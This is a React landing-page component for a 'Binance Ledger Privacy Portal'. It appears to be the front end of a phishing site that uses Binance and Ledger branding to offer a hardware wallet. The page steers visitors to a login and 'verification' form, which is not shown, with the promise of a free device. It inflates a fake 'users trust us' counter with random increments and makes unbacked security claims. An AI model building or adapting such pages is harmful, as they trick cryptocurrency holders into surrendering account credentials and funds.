
import React, { useState, useEffect } from "react";
import BinanceHeader from "@/components/BinanceHeader";
import BinanceFooter from "@/components/BinanceFooter";
import BinanceLedgerForm from "@/components/BinanceLedgerForm";
import BinanceAppPromotion from "@/components/BinanceAppPromotion";

const Index = () => {
  const [userCount, setUserCount] = useState(274368184);

  useEffect(() => {
    // Simulate counter increasing every few seconds
    const counterInterval = setInterval(() => {
      setUserCount(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 2000);
    
    return () => {
      clearInterval(counterInterval);
    };
  }, []);

  // Format the user count with commas
  const formattedUserCount = userCount.toLocaleString();

  return (
    <div className="min-h-screen flex flex-col bg-binance-dark text-white">
      <BinanceHeader />
      
      <main className="flex-grow">
        {/* Hero Section - made more compact */}
        <div className="bg-binance-dark py-6 md:py-10 relative overflow-hidden">
          <div className="container mx-auto px-4">
            <div className="max-w-5xl mx-auto">
              <div className="flex flex-col items-center text-center relative z-10">
                <h1 className="text-2xl md:text-3xl lg:text-4xl font-bold mb-3 md:mb-4">
                  Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
                </h1>
                <p className="text-gray-300 text-sm md:text-base mb-4 md:mb-6 max-w-2xl px-2 md:px-0">
                  Secure your crypto assets with the most trusted hardware wallet in the industry
                </p>
                
                {/* User Counter */}
                <div className="flex items-center justify-center">
                  <div className="w-8 h-px bg-binance-yellow my-auto mr-3"></div>
                  <div className="flex flex-col items-center">
                    <span className="text-binance-yellow text-lg md:text-xl font-bold">
                      {formattedUserCount}
                    </span>
                    <span className="text-[#848E9C] text-xs uppercase">
                      USERS TRUST US
                    </span>
                  </div>
                  <div className="w-8 h-px bg-binance-yellow my-auto ml-3"></div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Ledger Image positioned to overlap sections */}
          <div className="absolute right-0 top-1/2 transform -translate-y-1/2 z-20 hidden lg:block">
            <img 
              src="/lovable-uploads/8646239e-1623-49ec-aa43-4827449b9092.png" 
              alt="Binance Ledger Device" 
              className="max-w-md h-auto"
            />
          </div>
          
          {/* Tablet view for Ledger image */}
          <div className="hidden md:block lg:hidden absolute right-5 top-1/2 transform -translate-y-1/2 z-20">
            <img 
              src="/lovable-uploads/8646239e-1623-49ec-aa43-4827449b9092.png" 
              alt="Binance Ledger Device" 
              className="max-w-[250px] h-auto"
            />
          </div>
          
          {/* Mobile view for Ledger image - improved positioning as background element */}
          <div className="absolute inset-0 z-0 md:hidden flex items-center justify-center opacity-30">
            <img 
              src="/lovable-uploads/8646239e-1623-49ec-aa43-4827449b9092.png" 
              alt=""
              className="w-[300px] max-w-[80%] h-auto object-contain"
              aria-hidden="true"
            />
          </div>
        </div>
        
        {/* Form Section - improved mobile responsiveness */}
        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-6 relative">
          <div className="max-w-4xl mx-auto mb-4 md:mb-8 pt-3 md:pt-4 px-2 md:px-0">
            <h2 className="text-xl md:text-2xl font-bold mb-2 md:mb-3">Ledger Verification Portal</h2>
            <p className="text-gray-300 text-sm md:text-base">
              Please complete the login and verification process below to receive your Binance Ledger device 
              and link it securely to your wallet.
            </p>
          </div>
          
          <BinanceLedgerForm />
        </div>

        {/* Ledger Features Section */}
        <div className="bg-[#0B0E11] py-16 md:py-20">
          <div className="container mx-auto px-4">
            <div className="max-w-6xl mx-auto">
              <div className="text-center mb-12 md:mb-16">
                <h2 className="text-3xl md:text-4xl font-bold mb-4">
                  The Most Trusted Hardware Wallet
                </h2>
                <p className="text-gray-300 text-lg max-w-2xl mx-auto">
                  Secure your crypto with military-grade security and Binance integration
                </p>
              </div>

              {/* Features Grid */}
              <div className="grid md:grid-cols-3 gap-8 md:gap-12 mb-16">
                <div className="text-center">
                  <div className="w-16 h-16 bg-binance-yellow rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg className="w-8 h-8 text-black" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                    </svg>
                  </div>
                  <h3 className="text-xl font-bold mb-2">Bank-Level Security</h3>
                  <p className="text-gray-300">Your private keys never leave the device. Protected by certified secure chip technology.</p>
                </div>

                <div className="text-center">
                  <div className="w-16 h-16 bg-binance-yellow rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg className="w-8 h-8 text-black" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M13 3a9 9 0 0 0-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42A8.954 8.954 0 0 0 13 21a9 9 0 0 0 0-18z"/>
                    </svg>
                  </div>
                  <h3 className="text-xl font-bold mb-2">5000+ Assets</h3>
                  <p className="text-gray-300">Store and manage over 5000 cryptocurrencies including Bitcoin, Ethereum, and BNB.</p>
                </div>

                <div className="text-center">
                  <div className="w-16 h-16 bg-binance-yellow rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg className="w-8 h-8 text-black" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                    </svg>
                  </div>
                  <h3 className="text-xl font-bold mb-2">Easy to Use</h3>
                  <p className="text-gray-300">Simple setup and intuitive interface. Connect seamlessly with Binance and other platforms.</p>
                </div>
              </div>

              {/* Product Showcase */}
              <div className="grid md:grid-cols-2 gap-12 items-center">
                <div>
                  <h3 className="text-2xl md:text-3xl font-bold mb-6">
                    Binance Ledger Flex
                  </h3>
                  <div className="space-y-4 mb-8">
                    <div className="flex items-start space-x-3">
                      <div className="w-2 h-2 bg-binance-yellow rounded-full mt-2"></div>
                      <p className="text-gray-300">Large touchscreen for easy navigation and transaction verification</p>
                    </div>
                    <div className="flex items-start space-x-3">
                      <div className="w-2 h-2 bg-binance-yellow rounded-full mt-2"></div>
                      <p className="text-gray-300">USB-C and Bluetooth connectivity for maximum flexibility</p>
                    </div>
                    <div className="flex items-start space-x-3">
                      <div className="w-2 h-2 bg-binance-yellow rounded-full mt-2"></div>
                      <p className="text-gray-300">Direct integration with Binance platform and Binance Smart Chain</p>
                    </div>
                    <div className="flex items-start space-x-3">
                      <div className="w-2 h-2 bg-binance-yellow rounded-full mt-2"></div>
                      <p className="text-gray-300">Backup and recovery with 24-word recovery phrase</p>
                    </div>
                  </div>
                </div>
                <div className="relative">
                  <img 
                    src="/lovable-uploads/8646239e-1623-49ec-aa43-4827449b9092.png" 
                    alt="Binance Ledger Flex Device" 
                    className="w-full max-w-md mx-auto"
                  />
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Security Section */}
        <div className="bg-binance-dark py-16 md:py-20">
          <div className="container mx-auto px-4">
            <div className="max-w-6xl mx-auto">
              <div className="grid md:grid-cols-2 gap-12 items-center">
                <div className="relative order-2 md:order-1">
                  <div className="bg-gradient-to-br from-binance-yellow/20 to-transparent rounded-3xl p-8">
                    <img 
                      src="/lovable-uploads/8646239e-1623-49ec-aa43-4827449b9092.png" 
                      alt="Secure Binance Ledger" 
                      className="w-full max-w-sm mx-auto"
                    />
                  </div>
                </div>
                <div className="order-1 md:order-2">
                  <h3 className="text-2xl md:text-3xl font-bold mb-6">
                    Uncompromising Security
                  </h3>
                  <p className="text-gray-300 text-lg mb-6">
                    Your crypto assets deserve the highest level of protection. The Binance Ledger Flex uses 
                    industry-leading security features to keep your investments safe.
                  </p>
                  <div className="space-y-4">
                    <div className="flex items-center space-x-3">
                      <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                        </svg>
                      </div>
                      <span className="text-gray-300">CC EAL5+ certified secure element</span>
                    </div>
                    <div className="flex items-center space-x-3">
                      <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                        </svg>
                      </div>
                      <span className="text-gray-300">Open source software for transparency</span>
                    </div>
                    <div className="flex items-center space-x-3">
                      <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                        </svg>
                      </div>
                      <span className="text-gray-300">Multi-signature support</span>
                    </div>
                    <div className="flex items-center space-x-3">
                      <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                        <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
                        </svg>
                      </div>
                      <span className="text-gray-300">Anti-tampering design</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Call to Action Section */}
        <div className="bg-gradient-to-r from-binance-yellow to-yellow-400 py-16 md:py-20">
          <div className="container mx-auto px-4 text-center">
            <div className="max-w-4xl mx-auto">
              <h2 className="text-3xl md:text-4xl font-bold text-black mb-6">
                Ready to Secure Your Crypto?
              </h2>
              <p className="text-black/80 text-lg mb-8 max-w-2xl mx-auto">
                Join millions of users who trust Binance Ledger to protect their digital assets. 
                Complete the verification above to get started.
              </p>
              <div className="flex flex-col sm:flex-row gap-4 justify-center">
                <button 
                  onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
                  className="px-8 py-4 bg-black text-white rounded-lg font-semibold hover:bg-gray-800 transition-colors"
                >
                  Get Your Ledger Now
                </button>
                <a
                  href="https://www.ledger.com/academy"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="px-8 py-4 border-2 border-black text-black rounded-lg font-semibold hover:bg-black hover:text-white transition-colors"
                >
                  Learn More
                </a>
              </div>
            </div>
          </div>
        </div>
      </main>
      
      <BinanceFooter />
      <BinanceAppPromotion />
    </div>
  );
};

export default Index;
